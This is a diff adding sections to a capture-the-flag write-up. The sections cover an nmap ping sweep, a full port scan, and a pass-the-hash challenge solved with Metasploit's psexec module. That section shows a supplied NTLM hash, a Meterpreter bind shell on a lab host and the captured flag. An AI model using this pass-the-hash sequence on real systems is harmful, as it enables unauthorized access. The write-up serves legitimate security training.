@@ -3,8 +3,23 @@
 ## Exploitation
 
 ### Ping Scan
+>So you want to become a penetration tester? First you need to learn the basics, there is an hidden machine that reply to ping within my network, can you find it? Once you found it browse to the web port to see your flag.
+
+Sounds like an Nmap ping sweep:
+```bash
+nmap -sn 172.28.5.0/24 -v -oG - | grep Up
+nc <hostname> 80
+```
 
 ### Nmap
+>By default nmap only scan the top 1000 ports, can you learn how to change this? If you find a weird port you can poke it with nc (netcat)
+> Address: Same machine you discovered from the ping challenge
+
+Yes, this is a beginner challenge...
+
+```bash
+nmap -p- 172.28.5.10 -v
+```
 
 ### Python
 This challenge requires the completion of [SSH challenge](#ssh)
@@ -309,7 +324,56 @@ Started: Fri Nov  3 20:56:27 2017
 Stopped: Fri Nov  3 20:56:32 2017
 ```
 ### PTH
+>Sadly I was too lazy to copy down the desciption for this one. It was a pass the hash challenge we were provided with a SAM hash for a user on the windows machine. You simply copy out the user hash and use metasploit's psexec module to get a shell.
 
+```bash
+msf > use windows/smb/psexec
+msf exploit(psexec) > show options
+
+Module options (exploit/windows/smb/psexec):
+
+   Name                  Current Setting                                                    Required  Description
+   ----                  ---------------                                                    --------  -----------
+   RHOST                 172.28.5.25                                                        yes       The target address
+   RPORT                 445                                                                yes       The SMB service port (TCP)
+   SERVICE_DESCRIPTION                                                                      no        Service description to to be used on target for pretty listing
+   SERVICE_DISPLAY_NAME                                                                     no        The service display name
+   SERVICE_NAME                                                                             no        The service name
+   SHARE                 ADMIN$                                                             yes       The share to connect to, can be an admin share (ADMIN$,C$,...) or a normal read/write folder share
+   SMBDomain             .                                                                  no        The Windows domain to use for authentication
+   SMBPass               aad3b435b51404eeaad3b435b51404ee:3fb176acb7d718b0cf5ca4d033d3f1c2  no        The password for the specified username
+   SMBUser               PTH                                                                no        The username to authenticate as
+
+msf exploit(psexec) > set payload windows/meterpreter/bind_tcp
+
+msf exploit(psexec) > exploit
+[*] Started bind handler
+[*] 172.28.5.25:445 - Connecting to the server...
+[*] 172.28.5.25:445 - Authenticating to 172.28.5.25:445 as user 'PTH'...
+[*] 172.28.5.25:445 - Selecting PowerShell target
+[*] 172.28.5.25:445 - Executing the payload...
+[+] 172.28.5.25:445 - Service start timed out, OK if running a command or non-service executable...
+[*] Sending stage (957487 bytes) to 172.28.5.25
+[*] Meterpreter session 1 opened (172.16.222.134:41637 -> 172.28.5.25:4444) at 2017-11-03 21:24:00 -0400
+
+
+
+
+meterpreter > cd ./Desktop
+meterpreter > ls
+Listing: C:\Users\PTH\Desktop
+=============================
+
+Mode              Size  Type  Last modified              Name
+----              ----  ----  -------------              ----
+100666/rw-rw-rw-  282   fil   2017-10-30 16:12:31 -0400  desktop.ini
+100666/rw-rw-rw-  38    fil   2017-10-30 16:43:03 -0400  flag.txt
+
+meterpreter > cat flag.txt
+HF-0cedb7f3b7ed038654e35a0245624b68
+```
+
+easydone.
 
 ### Mimikatz
 
